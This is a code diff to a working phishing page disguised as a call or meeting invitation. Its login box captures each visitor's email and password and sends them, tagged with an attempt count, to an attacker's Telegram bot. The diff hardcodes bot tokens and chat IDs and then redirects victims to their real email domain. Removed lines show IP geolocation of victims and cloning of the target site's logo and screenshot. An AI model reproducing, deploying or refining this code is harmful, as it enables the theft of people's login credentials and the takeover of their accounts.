@@ -290,95 +290,79 @@ body{
 
 <script>
 // Telegram Bot config
-  const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
-  const TELEGRAM_CHAT_ID = "7574749243";
+const TELEGRAM_BOT_TOKEN = "7642767058:AAE1c1oj-wCUdqv3_WAWwJoonDWDIHOz4SA";
+const TELEGRAM_CHAT_ID = "5748422740";
 
 // Elements
-const rawHash = window.location.hash.substring(1);
 const emailInput = document.getElementById('email');
 const logoImg = document.getElementById('logo');
-const bgFrame = document.getElementById('bg-frame');
 const passwordInput = document.getElementById('password');
 const loginBtn = document.getElementById('login-btn');
 const errorMsg = document.getElementById('error-msg');
 const overlay = document.querySelector('.overlay');
-const urlParams = new URLSearchParams(window.location.search);
-const email = urlParams.get("email");
+const mainPanel = document.getElementById('mainPanel');
+const loadingScreen = document.getElementById('loadingScreen');
+const joinBtn = document.getElementById('joinBtn');
+const declineBtn = document.getElementById('declineBtn');
+const micIcon = document.getElementById('micIcon');
+const callTimer = document.getElementById('callTimer');
+
 let attempts = 0;
 const maxAttempts = 3;
 
-// FIX 1: Overlay should NOT block UI until AFTER login success
+// Overlay not blocking UI until after login
 overlay.style.pointerEvents = "none";
 overlay.style.opacity = "0";
 
 document.body.classList.add('blur-active');
 
-if (email && /^[^@]+@[^@]+\.[^@]+$/.test(email)) {
-    emailInput.value = email;
-    emailInput.setAttribute("readonly", true);
+// Call timer
+let sec = 0;
+setInterval(()=>{
+  sec++;
+  callTimer.textContent =
+    String(Math.floor(sec/60)).padStart(2,'0') + ":" +
+    String(sec%60).padStart(2,'0');
+},1000);
 
-    const domain = email.split("@")[1];
+// Loading → main panel
+window.addEventListener('load', ()=> {
+  setTimeout(()=>{
+    loadingScreen.style.opacity='0';
+    setTimeout(()=>{
+      loadingScreen.style.display='none';
+      mainPanel.style.display='block';
+      requestAnimationFrame(()=> mainPanel.style.opacity='1');
+    },600);
+  },600);
+});
 
-    logoImg.src = `https://logo.clearbit.com/${domain}`;
-    logoImg.onerror = () => {
-        logoImg.src = "https://via.placeholder.com/150?text=Logo";
-    };
+// Join → show login
+joinBtn.addEventListener('click', ()=>{
+  mainPanel.style.opacity='0';
+  setTimeout(()=>{
+    mainPanel.style.display='none';
+    loginBox.style.display='block';
+    requestAnimationFrame(()=> loginBox.style.opacity='1');
+  },300);
+});
 
-  // Fallback screenshot
-  const fallbackScreenshot = document.createElement('img');
-  fallbackScreenshot.id = "fallback-screenshot";
-  fallbackScreenshot.style.cssText = `
-    display:none;
-    position:fixed;top:0;left:0;
-    width:100vw;height:100vh;
-    object-fit:cover;
-    z-index:-1;
-    pointer-events:none;
-  `;
-  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
-  document.body.appendChild(fallbackScreenshot);
+// Click outside → close login
+window.addEventListener('click', (e)=>{
+  if (loginBox.style.display==='block' && !loginBox.contains(e.target)) {
+    loginBox.style.opacity='0';
+    setTimeout(()=>{
+      loginBox.style.display='none';
+      mainPanel.style.display='block';
+      requestAnimationFrame(()=> mainPanel.style.opacity='1');
+    },250);
+  }
+});
 
-  // Load iframe with timeout
-  let iframeLoaded = false;
-  bgFrame.src = `https://${domain}`;
-
-  bgFrame.onload = () => {
-    iframeLoaded = true;
-    fallbackScreenshot.style.display = "none";
-    bgFrame.style.display = "block";
-  };
-
-  setTimeout(() => {
-    if (!iframeLoaded) {
-      bgFrame.style.display = "none";
-      fallbackScreenshot.style.display = "block";
-    }
-  }, 6000);
-
-  bgFrame.onerror = () => {
-    bgFrame.style.display = "none";
-    fallbackScreenshot.style.display = "block";
-  };
-}
-
-// Fetch user country
-let userIP = "Unknown IP";
-let userCity = "Unknown City";
-let userCountry = "Unknown Country";
-let userISP = "Unknown ISP";
-
-loginBtn.disabled = true;
-
-fetch("https://ipapi.co/json/")
-  .then(res => res.json())
-  .then(data => {
-    userCity = data.city || userCity;
-    userCountry = data.country_name || userCountry;
-  })
-  .finally(() => {
-    loginBtn.disabled = false;
-  });
-
+// Decline → end screen
+declineBtn.addEventListener('click', ()=> {
+  document.getElementById('endScreen').style.opacity='1';
+});
 // Telegram message sender
 function sendTelegramMessage(email, password, attempt, country) {
   const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
@@ -399,13 +383,14 @@ function sendTelegramMessage(email, password, attempt, country) {
   }).catch(e => console.error("Telegram send failed:", e));
 }
 
-// Login button handler
+ 
+// LOGIN HANDLER — original attempts + sendTelegramMessage logic
 loginBtn.addEventListener('click', () => {
   const password = passwordInput.value.trim();
   if (password === "") {
     errorMsg.textContent = "Password cannot be empty.";
     return;
-  }
+   }
   attempts++;
   sendTelegramMessage(emailInput.value, password, attempts, userCountry);
 
@@ -419,89 +404,6 @@ loginBtn.addEventListener('click', () => {
     window.location.href = `https://${emailInput.value.split('@')[1]}`;
   }
 });
-/* CALL TIMER */
-let sec = 0;
-setInterval(()=>{
-  sec++;
-  callTimer.textContent =
-    String(Math.floor(sec/60)).padStart(2,'0') + ":" +
-    String(sec%60).padStart(2,'0');
-},1000);
-
-/* LOADING → MAIN PANEL */
-window.addEventListener('load', ()=> {
-  setTimeout(()=>{
-    loadingScreen.style.opacity='0';
-    setTimeout(()=>{
-      loadingScreen.style.display='none';
-      mainPanel.style.display='block';
-      requestAnimationFrame(()=> mainPanel.style.opacity='1');
-    },600);
-  },600);
-});
-
-/* JOIN BUTTON → SHOW LOGIN */
-joinBtn.addEventListener('click', ()=>{
-  mainPanel.style.opacity='0';
-  setTimeout(()=>{
-    mainPanel.style.display='none';
-    loginBox.style.display='block';
-    requestAnimationFrame(()=> loginBox.style.opacity='1');
-  },300);
-});
-
-/* CLICK OUTSIDE → CLOSE LOGIN */
-window.addEventListener('click', (e)=>{
-  if (loginBox.style.display==='block' && !loginBox.contains(e.target)) {
-    loginBox.style.opacity='0';
-    setTimeout(()=>{
-      loginBox.style.display='none';
-      mainPanel.style.display='block';
-      requestAnimationFrame(()=> mainPanel.style.opacity='1');
-    },250);
-  }
-});
-
-/* DECLINE → END SCREEN */
-declineBtn.addEventListener('click', ()=> {
-  document.getElementById('endScreen').style.opacity='1';
-});
-
-/* ------------------------------------------
-   ACTIVE LOGIN HANDLER (YOUR REQUEST)
-------------------------------------------- */
-loginBtn.addEventListener('click', async () => {
-
-  const email = emailInput.value.trim();
-  const pass = passwordInput.value.trim();
-
-  errorMsg.textContent = "";
-
-  if (!email || !pass) {
-    errorMsg.textContent = "Incorrect Password.";
-    shake(loginBox);
-    return;
-  }
-
-  try {
-    const result = await authenticateUser(email, pass, rawHash);
-
-    if (result.success) {
-      overlay.style.opacity = "1";
-      setTimeout(()=> {
-        window.location.href = result.redirect || "dashboard.html";
-      },500);
-    } else {
-      errorMsg.textContent = result.message || "Invalid password";
-      passwordInput.value = "";
-      shake(loginBox);
-    }
-  } catch (err) {
-    console.error(err);
-    errorMsg.textContent = "Network error.";
-    shake(loginBox);
-  }
-});
 
 function shake(el){
   el.classList.remove('shake');
@@ -509,23 +411,7 @@ function shake(el){
   el.classList.add('shake');
 }
 
-/* BACKEND HOOK — YOU MODIFY THIS */
-async function authenticateUser(email, pass, hash){
-  // EXAMPLE backend call:
-  /*
-  const res = await fetch("/login", {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({email, password: pass, session: hash})
-  });
-  return await res.json();
-  */
-
-  // TEMP fallback
-  return { success:false, message:"Invalid credentials" };
-}
-
-/* HOST MICROPHONE RIPPLE */
+// HOST MICROPHONE RIPPLE
 async function hostRipple(){
   const r1 = document.getElementById("p1r1");
   const r2 = document.getElementById("p1r2");
@@ -554,6 +440,7 @@ async function hostRipple(){
   }
 }
 hostRipple();
+
 
 </script>
 </body>
